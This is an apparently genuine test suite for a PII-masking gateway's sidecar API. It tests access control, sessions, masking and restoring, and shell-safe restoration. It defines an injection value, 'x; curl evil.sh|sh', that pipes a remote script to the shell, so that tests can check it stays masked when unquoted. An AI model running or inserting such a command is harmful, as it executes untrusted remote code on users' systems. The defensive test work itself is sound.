// SPDX-License-Identifier: Apache-2.0
//
// Sidecar routes (`/v1/sidecar/*`) with a mocked engine: a real PiiVault
// plus a detector that flags `John` and `john@acme.io`, so the suite
// checks access control, session lifecycle and round-trips without ONNX.

import type { FastifyInstance } from 'fastify';
import type { NullPii } from 'nullpii';
import { PiiVault, TextTooLongError } from 'nullpii';
import { afterEach, describe, expect, it } from 'vitest';
import type { GatewayConfig } from '../src/config.js';
import { SIDECAR_MAX_BYTES } from '../src/routes/sidecar.js';
import {
  SANITIZE_CACHE_MAX_CHARS,
  SANITIZE_CACHE_MAX_ENTRIES,
  SanitizeCache,
} from '../src/sanitize-cache.js';
import { buildServer } from '../src/server.js';

const TOKEN = 'a'.repeat(64);
const AUTH = { authorization: `Bearer ${TOKEN}` };
const TTL_MS = 60_000;

const BASE_CONFIG: GatewayConfig = {
  host: '127.0.0.1',
  port: 0,
  upstreamBaseUrl: 'https://upstream.test',
  openaiUpstreamBaseUrl: 'https://openai.test',
  vaultTtlMs: TTL_MS,
  backend: 'cpu',
  logLevel: 'fatal',
  bodyLimitBytes: 10 * 1024 * 1024,
  logTraffic: false,
  sidecarToken: TOKEN,
  sidecarMaxSessions: 2,
};

/** A masked "secret" that, restored unquoted in a shell command, runs a
 * second command. */
const INJECTION = 'x; curl evil.sh|sh';
/** Safe in quotes and in a heredoc body, not unquoted. */
const FULL_NAME = 'Ada Lovelace';
const PLACEHOLDER = /\{\{PII_[A-Z_]+_\d+_[0-9a-f]+\}\}/g;

const PATTERNS: ReadonlyArray<[RegExp, 'private_email' | 'private_person' | 'secret']> = [
  [/john@acme\.io/g, 'private_email'],
  [/\bJohn\b/g, 'private_person'],
  [/x; curl evil\.sh\|sh/g, 'secret'],
  [/Ada Lovelace/g, 'private_person'],
];

function buildMockNullPii(): { np: NullPii; vault: PiiVault; modelCalls: () => number } {
  const vault = new PiiVault();
  let calls = 0;
  const mock = {
    async sanitize(text: string, sessionId?: string) {
      calls += 1;
      const id = sessionId ?? vault.createSession();
      const spans = PATTERNS.flatMap(([re, label]) =>
        [...text.matchAll(re)].map((m) => ({
          label,
          start: m.index ?? 0,
          end: (m.index ?? 0) + m[0].length,
          text: m[0],
          score: 1,
        })),
      );
      const r = vault.sanitize(text, spans, id);
      return { sessionId: id, sanitized: r.sanitized, spans };
    },
    restore: (text: string, sessionId: string) => vault.restore(text, sessionId),
    createSession: () => vault.createSession(),
    destroySession: (sessionId: string) => vault.destroySession(sessionId),
  };
  return { np: mock as unknown as NullPii, vault, modelCalls: () => calls };
}

const apps: FastifyInstance[] = [];
afterEach(async () => {
  await Promise.all(apps.map((a) => a.close()));
  apps.length = 0;
});

interface Engine {
  np: NullPii;
  vault: PiiVault;
  modelCalls?: () => number;
}

async function setup(config: Partial<GatewayConfig> = {}, engine: Engine = buildMockNullPii()) {
  const { np, vault, modelCalls } = engine;
  const clock = { t: 1_000_000 };
  const app = await buildServer({ config: { ...BASE_CONFIG, ...config }, np, now: () => clock.t });
  apps.push(app);
  return { app, vault, clock, modelCalls: modelCalls ?? (() => 0) };
}

describe('sidecar · access control', () => {
  it('is not registered without a token', async () => {
    const { sidecarToken: _unused, ...noToken } = BASE_CONFIG;
    const { np } = buildMockNullPii();
    const app = await buildServer({ config: noToken, np });
    apps.push(app);
    const res = await app.inject({ method: 'GET', url: '/v1/sidecar/status', headers: AUTH });
    expect(res.statusCode).toBe(404);
  });

  it('refuses a missing or wrong bearer token', async () => {
    const { app } = await setup();
    const none = await app.inject({ method: 'GET', url: '/v1/sidecar/status' });
    const wrong = await app.inject({
      method: 'GET',
      url: '/v1/sidecar/status',
      headers: { authorization: `Bearer ${'b'.repeat(64)}` },
    });
    expect(none.statusCode).toBe(401);
    expect(wrong.statusCode).toBe(401);
  });

  it('refuses a non-loopback Host (DNS rebinding) even with the token', async () => {
    const { app } = await setup();
    const res = await app.inject({
      method: 'GET',
      url: '/v1/sidecar/status',
      headers: { ...AUTH, host: 'attacker.example:8787' },
    });
    expect(res.statusCode).toBe(403);
    expect(res.json()).toEqual({ error: 'host_not_allowed' });
  });

  it('refuses any request that carries an Origin header', async () => {
    const { app } = await setup();
    const res = await app.inject({
      method: 'PUT',
      url: '/v1/sidecar/sessions/s1',
      headers: { ...AUTH, origin: 'http://127.0.0.1:8787' },
    });
    expect(res.statusCode).toBe(403);
    expect(res.json()).toEqual({ error: 'origin_not_allowed' });
  });

  it('accepts loopback Host names with a port', async () => {
    const { app } = await setup();
    for (const host of ['127.0.0.1:8787', 'localhost:8787', '[::1]:8787']) {
      const res = await app.inject({
        method: 'GET',
        url: '/v1/sidecar/status',
        headers: { ...AUTH, host },
      });
      expect(res.statusCode).toBe(200);
    }
  });
});

describe('sidecar · sessions', () => {
  it('creates a session once, then reports it as existing', async () => {
    const { app } = await setup();
    const first = await app.inject({
      method: 'PUT',
      url: '/v1/sidecar/sessions/s1',
      headers: AUTH,
    });
    const second = await app.inject({
      method: 'PUT',
      url: '/v1/sidecar/sessions/s1',
      headers: AUTH,
    });
    expect(first.statusCode).toBe(201);
    expect(second.statusCode).toBe(200);
    expect(second.json()).toEqual({ status: 'exists' });
  });

  it('rejects a malformed session key', async () => {
    const { app } = await setup();
    const res = await app.inject({
      method: 'PUT',
      url: '/v1/sidecar/sessions/bad!key',
      headers: AUTH,
    });
    expect(res.statusCode).toBe(400);
    expect(res.json()).toEqual({ error: 'invalid_session_key' });
  });

  it('fails with 429 instead of evicting when the table is full', async () => {
    const { app } = await setup();
    for (const key of ['s1', 's2']) {
      await app.inject({ method: 'PUT', url: `/v1/sidecar/sessions/${key}`, headers: AUTH });
    }
    const third = await app.inject({
      method: 'PUT',
      url: '/v1/sidecar/sessions/s3',
      headers: AUTH,
    });
    expect(third.statusCode).toBe(429);
    const stillThere = await app.inject({
      method: 'POST',
      url: '/v1/sidecar/sessions/s1/sanitize',
      headers: AUTH,
      payload: { value: 'hi John' },
    });
    expect(stillThere.statusCode).toBe(200);
  });

  it('drops an idle session and its vault entries after the TTL', async () => {
    const { app, vault, clock } = await setup();
    await app.inject({ method: 'PUT', url: '/v1/sidecar/sessions/s1', headers: AUTH });
    expect(vault.sessionCount).toBe(1);
    clock.t += TTL_MS + 1;
    const res = await app.inject({
      method: 'POST',
      url: '/v1/sidecar/sessions/s1/sanitize',
      headers: AUTH,
      payload: { value: 'hi John' },
    });
    expect(res.statusCode).toBe(404);
    expect(vault.sessionCount).toBe(0);
  });

  it('keeps a session alive while it is used', async () => {
    const { app, clock } = await setup();
    await app.inject({ method: 'PUT', url: '/v1/sidecar/sessions/s1', headers: AUTH });
    for (let i = 0; i < 3; i += 1) {
      clock.t += TTL_MS - 1;
      const res = await app.inject({
        method: 'POST',
        url: '/v1/sidecar/sessions/s1/sanitize',
        headers: AUTH,
        payload: { value: 'hi' },
      });
      expect(res.statusCode).toBe(200);
    }
  });

  it('destroys a session on DELETE, then 404s', async () => {
    const { app, vault } = await setup();
    await app.inject({ method: 'PUT', url: '/v1/sidecar/sessions/s1', headers: AUTH });
    const del = await app.inject({
      method: 'DELETE',
      url: '/v1/sidecar/sessions/s1',
      headers: AUTH,
    });
    const again = await app.inject({
      method: 'DELETE',
      url: '/v1/sidecar/sessions/s1',
      headers: AUTH,
    });
    expect(del.statusCode).toBe(204);
    expect(again.statusCode).toBe(404);
    expect(vault.sessionCount).toBe(0);
  });

  it('wipes every session when the server closes', async () => {
    const { app, vault } = await setup();
    await app.inject({ method: 'PUT', url: '/v1/sidecar/sessions/s1', headers: AUTH });
    await app.close();
    expect(vault.sessionCount).toBe(0);
  });
});

describe('sidecar · sanitize and restore', () => {
  it('masks a string and returns counts, never the values', async () => {
    const { app } = await setup();
    await app.inject({ method: 'PUT', url: '/v1/sidecar/sessions/s1', headers: AUTH });
    const res = await app.inject({
      method: 'POST',
      url: '/v1/sidecar/sessions/s1/sanitize',
      headers: AUTH,
      payload: { value: 'Mail John at john@acme.io' },
    });
    expect(res.statusCode).toBe(200);
    const body = res.json() as { value: string; captured: number; capturedByLabel: object };
    expect(res.body).not.toContain('John');
    expect(res.body).not.toContain('john@acme.io');
    expect(body.captured).toBe(2);
    expect(body.capturedByLabel).toEqual({ private_email: 1, private_person: 1 });
  });

  it('round-trips a JSON tool result across separate calls in one session', async () => {
    const { app } = await setup();
    await app.inject({ method: 'PUT', url: '/v1/sidecar/sessions/s1', headers: AUTH });
    const value = { stdout: 'owner: John', rows: [{ email: 'john@acme.io', n: 3 }] };
    const masked = await app.inject({
      method: 'POST',
      url: '/v1/sidecar/sessions/s1/sanitize',
      headers: AUTH,
      payload: { value },
    });
    const restored = await app.inject({
      method: 'POST',
      url: '/v1/sidecar/sessions/s1/restore',
      headers: AUTH,
      payload: { value: (masked.json() as { value: unknown }).value },
    });
    expect(restored.statusCode).toBe(200);
    const body = restored.json() as { value: unknown; replacements: number };
    expect(body.value).toEqual(value);
    expect(body.replacements).toBe(2);
  });

  it('restores only the named fields of a tool input', async () => {
    const { app } = await setup();
    await app.inject({ method: 'PUT', url: '/v1/sidecar/sessions/s1', headers: AUTH });
    const masked = await app.inject({
      method: 'POST',
      url: '/v1/sidecar/sessions/s1/sanitize',
      headers: AUTH,
      payload: { value: { new_string: 'Hi John', description: 'greet John' } },
    });
    const maskedValue = (masked.json() as { value: { description: string } }).value;
    const res = await app.inject({
      method: 'POST',
      url: '/v1/sidecar/sessions/s1/restore',
      headers: AUTH,
      payload: { value: maskedValue, fields: ['new_string'] },
    });
    const out = (res.json() as { value: { new_string: string; description: string } }).value;
    expect(out.new_string).toBe('Hi John');
    expect(out.description).toBe(maskedValue.description);
    expect(out.description).not.toContain('John');
  });

  it('rejects fields on a non-object value', async () => {
    const { app } = await setup();
    await app.inject({ method: 'PUT', url: '/v1/sidecar/sessions/s1', headers: AUTH });
    const res = await app.inject({
      method: 'POST',
      url: '/v1/sidecar/sessions/s1/restore',
      headers: AUTH,
      payload: { value: 'text', fields: ['x'] },
    });
    expect(res.statusCode).toBe(400);
  });

  it('does not restore placeholders minted by another session', async () => {
    const { app } = await setup();
    for (const key of ['s1', 's2']) {
      await app.inject({ method: 'PUT', url: `/v1/sidecar/sessions/${key}`, headers: AUTH });
    }
    const masked = await app.inject({
      method: 'POST',
      url: '/v1/sidecar/sessions/s1/sanitize',
      headers: AUTH,
      payload: { value: 'hi John' },
    });
    const res = await app.inject({
      method: 'POST',
      url: '/v1/sidecar/sessions/s2/restore',
      headers: AUTH,
      payload: { value: (masked.json() as { value: string }).value },
    });
    const body = res.json() as { value: string; replacements: number; foreignPlaceholders: number };
    expect(body.value).not.toContain('John');
    expect(body.replacements).toBe(0);
    expect(body.foreignPlaceholders).toBe(1);
  });

  it('refuses a request body over the 4 MiB limit', async () => {
    const { app } = await setup();
    await app.inject({ method: 'PUT', url: '/v1/sidecar/sessions/s1', headers: AUTH });
    const res = await app.inject({
      method: 'POST',
      url: '/v1/sidecar/sessions/s1/sanitize',
      headers: AUTH,
      payload: { value: 'x'.repeat(SIDECAR_MAX_BYTES) },
    });
    expect(res.statusCode).toBe(413);
  });

  it('maps an over-long string leaf to 413 text_too_long', async () => {
    const engine = buildMockNullPii();
    const strict = {
      ...(engine.np as object),
      sanitize: async (text: string) => {
        throw new TextTooLongError(text.length, 10, 'bytes');
      },
    } as unknown as NullPii;
    const { app } = await setup({}, { np: strict, vault: engine.vault });
    await app.inject({ method: 'PUT', url: '/v1/sidecar/sessions/s1', headers: AUTH });
    const res = await app.inject({
      method: 'POST',
      url: '/v1/sidecar/sessions/s1/sanitize',
      headers: AUTH,
      payload: { value: 'more than ten bytes' },
    });
    expect(res.statusCode).toBe(413);
    expect(res.json()).toEqual({ error: 'text_too_long' });
  });

  it('returns 413 when masking grows the response over the limit', async () => {
    // Placeholders are longer than most values they replace. Stand in for
    // a dense input with an engine whose output is over the limit.
    const engine = buildMockNullPii();
    const grown = {
      ...(engine.np as object),
      sanitize: async (_text: string, sessionId: string) => ({
        sessionId,
        sanitized: 'x'.repeat(SIDECAR_MAX_BYTES + 1),
        spans: [],
      }),
    } as unknown as NullPii;
    const { app } = await setup({}, { np: grown, vault: engine.vault });
    await app.inject({ method: 'PUT', url: '/v1/sidecar/sessions/s1', headers: AUTH });
    const res = await app.inject({
      method: 'POST',
      url: '/v1/sidecar/sessions/s1/sanitize',
      headers: AUTH,
      payload: { value: 'small input' },
    });
    expect(res.statusCode).toBe(413);
    expect(res.json()).toEqual({ error: 'response_too_large' });
  });
});

describe('sidecar · restore with shell', () => {
  interface ShellRestoreBody {
    value: Record<string, string>;
    replacements: number;
    shellKeptMasked?: string[];
  }

  /** Open session `s1`, mask `text` in it, return its placeholders. */
  async function placeholdersFor(app: FastifyInstance, text: string): Promise<string[]> {
    await app.inject({ method: 'PUT', url: '/v1/sidecar/sessions/s1', headers: AUTH });
    const res = await app.inject({
      method: 'POST',
      url: '/v1/sidecar/sessions/s1/sanitize',
      headers: AUTH,
      payload: { value: text },
    });
    return (res.json() as { value: string }).value.match(PLACEHOLDER) ?? [];
  }

  function restore(app: FastifyInstance, payload: Record<string, unknown>) {
    return app.inject({
      method: 'POST',
      url: '/v1/sidecar/sessions/s1/restore',
      headers: AUTH,
      payload,
    });
  }

  function commitWith(message: string): string {
    return `git commit -m "$(cat <<'EOF'\n${message}\nEOF\n)"`;
  }

  it('keeps an unsafe unquoted value masked and lists its placeholder, never the value', async () => {
    const { app } = await setup();
    const [secret] = await placeholdersFor(app, INJECTION);

    const res = await restore(app, {
      value: { command: `echo ${secret}` },
      fields: ['command'],
      shell: true,
    });

    expect(res.statusCode).toBe(200);
    const body = res.json() as ShellRestoreBody;
    expect(body.value.command).toBe(`echo ${secret}`);
    expect(body.shellKeptMasked).toEqual([secret]);
    expect(res.body).not.toContain(INJECTION);
    expect(res.body).not.toContain('evil.sh');
  });

  it('restores the same value inside single quotes', async () => {
    const { app } = await setup();
    const [secret] = await placeholdersFor(app, INJECTION);

    const res = await restore(app, {
      value: { command: `echo '${secret}'` },
      fields: ['command'],
      shell: true,
    });

    const body = res.json() as ShellRestoreBody;
    expect(body.value.command).toBe(`echo '${INJECTION}'`);
    expect(body.shellKeptMasked).toEqual([]);
  });

  it('restores a two-word name in a quoted heredoc (Claude Code commit message)', async () => {
    const { app } = await setup();
    const [person] = await placeholdersFor(app, FULL_NAME);

    const res = await restore(app, {
      value: { command: commitWith(`Thanks ${person}`) },
      fields: ['command'],
      shell: true,
    });

    const body = res.json() as ShellRestoreBody;
    expect(body.value.command).toBe(commitWith(`Thanks ${FULL_NAME}`));
    expect(body.shellKeptMasked).toEqual([]);
  });

  it('keeps a `python3 - <<EOF` body masked, never returning the value', async () => {
    const { app } = await setup();
    const [person] = await placeholdersFor(app, FULL_NAME);
    const command = `python3 - <<'EOF'\nprint('${person}')\nEOF`;

    const res = await restore(app, { value: { command }, fields: ['command'], shell: true });

    const body = res.json() as ShellRestoreBody;
    expect(body.value.command).toBe(command);
    expect(body.shellKeptMasked).toEqual([person]);
    expect(res.body).not.toContain(FULL_NAME);
  });

  it('restores the other fields as usual, and every field when `fields` is absent', async () => {
    const { app } = await setup();
    const [secret] = await placeholdersFor(app, INJECTION);

    const res = await restore(app, {
      value: { command: `echo ${secret}`, description: `print ${secret}` },
      shell: true,
    });

    const body = res.json() as ShellRestoreBody;
    expect(body.value.command).toBe(`echo ${secret}`);
    expect(body.value.description).toBe(`print ${INJECTION}`);
    expect(body.shellKeptMasked).toEqual([secret]);
  });

  it('without `shell`: plain restore, unchanged, and no shellKeptMasked field', async () => {
    const { app } = await setup();
    const [secret] = await placeholdersFor(app, INJECTION);

    const res = await restore(app, { value: { command: `echo ${secret}` }, fields: ['command'] });

    expect(res.statusCode).toBe(200);
    const body = res.json() as ShellRestoreBody;
    expect(body.value.command).toBe(`echo ${INJECTION}`);
    expect(body.replacements).toBe(1);
    expect(Object.hasOwn(body, 'shellKeptMasked')).toBe(false);
  });

  it('rejects `shell` on a value that is not an object', async () => {
    const { app } = await setup();
    await placeholdersFor(app, INJECTION);

    const res = await restore(app, { value: 'echo hi', shell: true });

    expect(res.statusCode).toBe(400);
    expect(res.json()).toEqual({ error: 'shell_requires_object_value' });
  });
});

describe('sidecar · sanitize cache', () => {
  const VALUE = { stdout: 'owner: John <john@acme.io>' };

  async function sanitize(app: FastifyInstance, key: string, value: unknown) {
    return app.inject({
      method: 'POST',
      url: `/v1/sidecar/sessions/${key}/sanitize`,
      headers: AUTH,
      payload: { value },
    });
  }

  it('answers a repeated value from the cache, identical and without the model', async () => {
    const { app, modelCalls } = await setup();
    await app.inject({ method: 'PUT', url: '/v1/sidecar/sessions/s1', headers: AUTH });
    const first = await sanitize(app, 's1', VALUE);
    const callsAfterFirst = modelCalls();
    const second = await sanitize(app, 's1', VALUE);
    expect(first.headers['x-nullpii-cache']).toBe('miss');
    expect(second.headers['x-nullpii-cache']).toBe('hit');
    expect(second.body).toBe(first.body);
    expect(modelCalls()).toBe(callsAfterFirst);
  });

  it('keeps sessions apart: another session runs the model and gets its own placeholders', async () => {
    const { app } = await setup();
    for (const key of ['s1', 's2']) {
      await app.inject({ method: 'PUT', url: `/v1/sidecar/sessions/${key}`, headers: AUTH });
    }
    const a = await sanitize(app, 's1', VALUE);
    const b = await sanitize(app, 's2', VALUE);
    expect(b.headers['x-nullpii-cache']).toBe('miss');
    expect(b.body).not.toBe(a.body);
  });

  it('a cached response still restores in its session', async () => {
    const { app } = await setup();
    await app.inject({ method: 'PUT', url: '/v1/sidecar/sessions/s1', headers: AUTH });
    await sanitize(app, 's1', VALUE);
    const cached = await sanitize(app, 's1', VALUE);
    const restored = await app.inject({
      method: 'POST',
      url: '/v1/sidecar/sessions/s1/restore',
      headers: AUTH,
      payload: { value: (cached.json() as { value: unknown }).value },
    });
    expect((restored.json() as { value: unknown }).value).toEqual(VALUE);
  });

  it('starts empty again after the session is closed and reopened', async () => {
    const { app } = await setup();
    await app.inject({ method: 'PUT', url: '/v1/sidecar/sessions/s1', headers: AUTH });
    await sanitize(app, 's1', VALUE);
    await app.inject({ method: 'DELETE', url: '/v1/sidecar/sessions/s1', headers: AUTH });
    await app.inject({ method: 'PUT', url: '/v1/sidecar/sessions/s1', headers: AUTH });
    const again = await sanitize(app, 's1', VALUE);
    expect(again.headers['x-nullpii-cache']).toBe('miss');
  });
});

describe('SanitizeCache', () => {
  it('drops the least recently used entries past its entry bound', () => {
    const cache = new SanitizeCache();
    for (let i = 0; i <= SANITIZE_CACHE_MAX_ENTRIES; i += 1) cache.set(`k${i}`, 'x');
    expect(cache.size).toBe(SANITIZE_CACHE_MAX_ENTRIES);
    expect(cache.get('k0')).toBeUndefined();
    expect(cache.get(`k${SANITIZE_CACHE_MAX_ENTRIES}`)).toBe('x');
  });

  it('keeps a recently read entry over an older one', () => {
    const cache = new SanitizeCache();
    for (let i = 0; i < SANITIZE_CACHE_MAX_ENTRIES; i += 1) cache.set(`k${i}`, 'x');
    cache.get('k0');
    cache.set('new', 'x');
    expect(cache.get('k0')).toBe('x');
    expect(cache.get('k1')).toBeUndefined();
  });

  it('never stores a response larger than its character bound', () => {
    const cache = new SanitizeCache();
    cache.set('big', 'x'.repeat(SANITIZE_CACHE_MAX_CHARS + 1));
    expect(cache.get('big')).toBeUndefined();
  });
});
